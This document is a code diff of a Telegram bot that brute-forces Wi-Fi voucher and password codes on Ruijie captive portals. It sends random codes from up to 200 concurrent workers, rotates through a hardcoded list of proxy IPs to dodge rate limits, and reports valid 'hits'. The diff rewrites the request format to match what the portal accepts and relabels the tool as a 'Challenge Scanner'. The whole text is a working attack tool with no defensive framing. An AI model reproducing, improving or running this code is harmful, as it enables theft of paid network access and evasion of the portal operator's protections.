@@ -5,13 +5,13 @@ import aiohttp
 import random
 import string
 import time
+from urllib.parse import urlparse, parse_qs
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ပေးပို့ထားသော Proxy စာရင်းများကို တခါတည်း ထည့်သွင်းထားခြင်း
 EMBEDDED_PROXIES = [
     "103.77.173.125:9486", "160.19.16.101:8181", "172.210.12.8:3128", "41.33.245.139:1976",
     "41.128.77.76:1981", "41.128.77.76:1976", "178.92.72.154:8080", "154.201.126.44:8080",
@@ -39,10 +39,7 @@ EMBEDDED_PROXIES = [
 ]
 
 def load_proxies_from_file():
-    if EMBEDDED_PROXIES:
-        print(f"[ProxyManager] Loaded {len(EMBEDDED_PROXIES)} proxies directly from script.")
-        return EMBEDDED_PROXIES
-    return ["103.152.112.15:8080"]
+    return EMBEDDED_PROXIES
 
 scanning_states = {}
 user_modes = {}
@@ -58,7 +55,7 @@ limits_counters = {}
 
 def show_startup_banner():
     print("=" * 65)
-    print("  ⚡  RUIJIE EXTREME VOUCHER SCANNER (EMBEDDED PROXIES)  ⚡")
+    print("  ⚡  RUIJIE ADVANCED CHALLENGE SCANNER  ⚡")
     print("=" * 65)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -67,31 +64,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_modes[chat_id] = "num6"
     if chat_id not in user_workers:
         user_workers[chat_id] = 200
-    
     if chat_id not in user_proxies or not user_proxies[chat_id]:
         user_proxies[chat_id] = load_proxies_from_file()
-    
     if chat_id not in proxy_indices:
         proxy_indices[chat_id] = 0
         
     total_proxies = len(user_proxies.get(chat_id, []))
-    current_proxy_display = f"{total_proxies}/{total_proxies}" if total_proxies > 0 else "0/0"
     
     keyboard = [
         [InlineKeyboardButton("🌐 Update Portal Link", callback_data="update_portal")],
         [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
         [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
-        [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
+        [InlineKeyboardButton(f"🔀 Proxies: {total_proxies}", callback_data="add_proxies")],
         [InlineKeyboardButton("🚀 Start Scanner By Kage", callback_data="start_scanner")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     text = (
-        "⚡ Starlink Scanner Control Panel ⚡\n\n"
+        "⚡ Ruijie Advanced Portal Scanner ⚡\n\n"
         f"⚙ Current Mode: {user_modes[chat_id]}\n"
         f"🔧 Workers: {user_workers[chat_id]}\n"
-        f"📁 Proxy Mode: Embedded List\n"
-        f"🔀 Proxies: {current_proxy_display}"
+        f"🔀 Proxies Loaded: {total_proxies}"
     )
     
     if update.message:
@@ -110,14 +103,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "update_portal":
         await query.answer()
         context.user_data['waiting_for'] = 'portal'
-        await query.message.reply_text("🔗 Portal URL ကို ပို့ပေးပါ:")
+        await query.message.reply_text("🔗 Ruijie Portal URL အပြည့်အစုံကို ထည့်ပေးပါ:")
     
     elif data == "change_mode":
         await query.answer()
         keyboard = [
-            [InlineKeyboardButton("Num 6", callback_data="mode_num6"), InlineKeyboardButton("Num 7 Kage", callback_data="mode_num7"), InlineKeyboardButton("Num 8 Kage", callback_data="mode_num8")],
-            [InlineKeyboardButton("Num 9", callback_data="mode_num9"), InlineKeyboardButton("Abc 6", callback_data="mode_abc6")],
-            [InlineKeyboardButton("Mix6 Formula", callback_data="mode_mix6"), InlineKeyboardButton("Mix7 Random", callback_data="mode_mix7")],
+            [InlineKeyboardButton("Num 6", callback_data="mode_num6"), InlineKeyboardButton("Num 7", callback_data="mode_num7"), InlineKeyboardButton("Num 8", callback_data="mode_num8")],
+            [InlineKeyboardButton("Abc 6", callback_data="mode_abc6"), InlineKeyboardButton("Mix6", callback_data="mode_mix6")],
             [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
         ]
         await query.message.edit_text("⚙ Choose Scanner Mode", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -150,14 +142,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "add_proxies":
         user_proxies[chat_id] = load_proxies_from_file()
-        await query.answer("Proxies reloaded successfully!")
+        await query.answer("Proxies reloaded!")
         await start(update, context)
     
     elif data == "start_scanner":
         await query.answer()
         portal = user_portals.get(chat_id)
         if not portal:
-            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင် Update လုပ်ပါ။")
+            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင်ထည့်ပါ။")
             return
         if scanning_states.get(chat_id, False):
             await query.message.reply_text("⚠ စကင်န်ဖတ်ခြင်း လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
@@ -192,6 +184,18 @@ def generate_code_by_mode(mode):
     return "".join(random.choices(string.digits, k=length))
 
 async def worker_task(worker_id, session, portal_url, chat_id):
+    parsed_url = urlparse(portal_url)
+    query_params = parse_qs(parsed_url.query)
+    
+    # URL ထဲက ပါပြီးသား Parameter များကို ထုတ်ယူခြင်း
+    base_endpoint = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+    
+    base_params = {}
+    for key, val in query_params.items():
+        base_params[key] = val[0]
+        
+    base_params["stage"] = "login"
+
     while scanning_states.get(chat_id, False):
         mode = user_modes.get(chat_id, "num6")
         code_val = generate_code_by_mode(mode)
@@ -208,18 +212,17 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             proxy = f"http://{proxy}"
             
         try:
-            base_url = portal_url.replace("stage=portal", "stage=login")
-            payload = {
-                "code": code_val,
-                "token": code_val,
-                "password": code_val
-            }
+            # Ruijie လက်ခံသည့် Param ပုံစံအတိုင်း ပို့ဆောင်ခြင်း
+            payload_params = base_params.copy()
+            payload_params["token"] = code_val
+            payload_params["password"] = code_val
+            payload_params["code"] = code_val
+
             headers = {
-                "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
             }
             
-            async with session.post(base_url, json=payload, headers=headers, proxy=proxy, timeout=3.0) as response:
+            async with session.get(base_endpoint, params=payload_params, headers=headers, proxy=proxy, timeout=3.0) as response:
                 text_content = await response.text()
                 lower_text = text_content.lower()
                 
@@ -254,7 +257,7 @@ async def run_scanner_with_workers(query, context, portal_url):
     workers_count = user_workers.get(chat_id, 200)
     
     stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
-    status_message = await query.message.reply_text("⚡ Scanner Running ...\nThank for using Telegram @Kage", reply_markup=stop_keyboard)
+    status_message = await query.message.reply_text("⚡ Challenge Scanner Running ...\nBy Telegram @Kage", reply_markup=stop_keyboard)
     
     connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
@@ -272,11 +275,11 @@ async def run_scanner_with_workers(query, context, portal_url):
             hits_str = "\n".join([f"🔥 {code} | Valid" for code in hits_list[-5:]]) if hits_list else "None yet"
             
             live_text = (
-                "⚡ Scanner Running ⚡\n"
-                "Thank for using By Telegram @Kage\n\n"
+                "⚡ Challenge Scanner Running ⚡\n"
+                "By Telegram @Kage\n\n"
                 f"🏹 Tried: {tried:,}\n"
                 f"🎯 Current Code: {current_codes_tracker.get(chat_id, '000000')}\n"
-                f"🔥 Real Hits: {len(hits_list)} BY @Kage ကုဒ်စစ်\n"
+                f"🔥 Real Hits: {len(hits_list)}\n"
                 f"❌ Expired: {expired}\n"
                 f"⚠️ Limits: {limits}\n"
                 f"⚡ Speed: {speed:,.1f} c/m\n"
@@ -291,7 +294,7 @@ async def run_scanner_with_workers(query, context, portal_url):
             t.cancel()
 
     final_hits = found_codes.get(chat_id, [])
-    final_text = f"🛑 ပြီးဆုံးပါပြီ။\n\n"
+    final_text = f"🛑 စကင်န်ဖတ်ခြင်း ပြီးဆုံးပါပြီ။\n\n"
     if final_hits:
         final_text += "🔥 Verified Hit Codes Found:\n" + "\n".join(final_hits)
     else:
@@ -312,4 +315,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
+        
